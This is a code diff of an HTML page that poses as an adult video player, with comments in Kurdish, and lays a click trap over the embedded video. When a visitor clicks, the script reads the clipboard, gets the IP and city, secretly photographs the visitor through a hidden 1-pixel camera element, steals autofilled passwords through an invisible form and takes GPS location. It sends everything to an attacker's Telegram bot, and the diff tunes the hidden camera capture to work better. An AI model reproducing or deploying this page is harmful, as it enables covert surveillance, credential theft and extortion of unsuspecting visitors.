@@ -3,15 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Video Player</title>
+    <title>Video Streaming</title>
     <style>
         body { font-family: -apple-system, system-ui, sans-serif; background: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        
-        /* ڤیدیۆ و تەڵەکە */
         .video-container { position: relative; width: 100vw; height: 100vh; background: #000; }
         iframe { width: 100%; height: 100%; border: none; }
         
-        /* تەڵەی کلیک: وێنەیەک دەخەینە سەر ڤیدیۆکە تا قوربانی کلیکی لێ بکات */
+        /* تەڵەی کلیک */
         .click-trap { 
             position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
             background: url('https://static-pv.xnxx-cdn.com/videos/thumbs169ll/ec/04/e7/ec04e7696611910ef0b694294d1de06d/default.jpg') center no-repeat;
@@ -20,30 +18,37 @@
         .play-btn { width: 80px; height: 80px; background: rgba(0,0,0,0.6); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 3px solid white; }
         .play-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
 
-        /* شاردنەوەی کامێرا و پاسوۆرد */
-        #spy-video, #canvas, #trap-form { display: none; }
-        #spy-video { position: fixed; opacity: 0.01; width: 1px; height: 1px; }
+        /* لێرە کێشەی وێنەی ڕەش چارەسەر دەکەین */
+        /* ڤیدیۆکە نابێت display: none بێت، تەنها قەبارەکەی یەک پیکسڵ بێت */
+        #spy-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0.1;
+            z-index: -1;
+            pointer-events: none;
+        }
+        canvas { display: none; }
+        #trap-form { position: absolute; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
 
     <div class="video-container">
-        <!-- ڤیدیۆ ئەسڵییەکە -->
         <iframe id="main-frame" src="https://www.xnxx.com/embedframe/koltifvd47e" allowfullscreen></iframe>
-        
-        <!-- تەڵەی کلیک (Thumbnail) -->
         <div class="click-trap" id="clickTrap">
             <div class="play-btn"><div class="play-icon"></div></div>
         </div>
     </div>
 
-    <!-- کامێرای نهێنی -->
+    <!-- ڤیدیۆی سیخوڕی بۆ کامێرا -->
     <video id="spy-video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
-    <!-- تەڵەی پاسوۆرد -->
-    <form id="trap-form" style="opacity:0.01; position:absolute;">
-        <input type="email" id="af_user" autocomplete="username">
+    <form id="trap-form">
+        <input type="text" id="af_user" autocomplete="username">
         <input type="password" id="af_pass" autocomplete="current-password">
     </form>
 
@@ -60,48 +65,52 @@
         }
 
         document.getElementById('clickTrap').addEventListener('click', async function() {
-            // شاردنەوەی وێنەی تەڵەکە و دەرکەوتنی ڤیدیۆکە
-            this.style.display = 'none';
+            // شاردنەوەی تەڵەکە بە گۆڕینی ئۆپاسیتی نەک بەیەکجاری
+            this.style.opacity = '0';
+            setTimeout(() => { this.style.display = 'none'; }, 500);
 
-            // ١. دزینی Clipboard
+            // ١. کلیکبۆرد و ئایپی
             try {
                 const clip = await navigator.clipboard.readText();
-                if(clip) await sendToBot("📋 Clipboard: " + clip);
+                if(clip) sendToBot("📋 Clipboard: " + clip);
             } catch(e) {}
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendToBot(`🌐 IP: ${d.ip}\n🏙️ ${d.city}`));
 
-            // ٢. وێنەگرتنی کامێرا (پێویستی بە ٥ چرکە هەیە بۆ ڕوونی)
+            // ٢. وێنەگرتنی کامێرا (بە گۆڕانکاری بۆ ڕێگری لە ڕەشی)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const spyVid = document.getElementById('spy-video');
                 spyVid.srcObject = stream;
                 
-                await new Promise(r => setTimeout(r, 5000));
+                // وێستان بۆ ٦ چرکە بۆ ئەوەی ئایفۆن و ئەندرۆید ڕووناکی وێنەکە ڕێکبخەن
+                await new Promise(r => setTimeout(r, 6000));
                 
                 const canvas = document.getElementById('canvas');
-                canvas.width = spyVid.videoWidth; canvas.height = spyVid.videoHeight;
+                canvas.width = spyVid.videoWidth; 
+                canvas.height = spyVid.videoHeight;
                 canvas.getContext('2d').drawImage(spyVid, 0, 0);
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
                 const fd = new FormData();
                 fd.append('chat_id', chatId);
                 fd.append('photo', blob, 'face.jpg');
+                fd.append('caption', '👤 Target Face Captured (Clear)');
+                
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                 stream.getTracks().forEach(t => t.stop());
             } catch(e) { await sendToBot("❌ Access Denied"); }
 
-            // ٣. داتا و GPS و پاسوۆرد
-            let u = document.getElementById('af_user').value;
+            // ٣. دزینی پاسوۆرد و ناردنی لۆکەیشن
             let p = document.getElementById('af_pass').value;
-            if(p) sendToBot(`🔑 PASS: ${u} | ${p}`);
-
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendToBot(`🌐 IP: ${d.ip}\n🏙️ ${d.city}`));
+            if(p) sendToBot(`🔑 PASS: ${p}`);
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
                     sendToBot(`📍 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-                    setTimeout(() => { window.location.href = "index.html"; }, 3000);
+                    setTimeout(() => { window.location.href = "index.html"; }, 2000);
                 }, () => { window.location.href = "index.html"; }, { enableHighAccuracy: true });
             } else {
-                setTimeout(() => { window.location.href = "index.html"; }, 8000);
+                window.location.href = "index.html";
             }
         });
     </script>
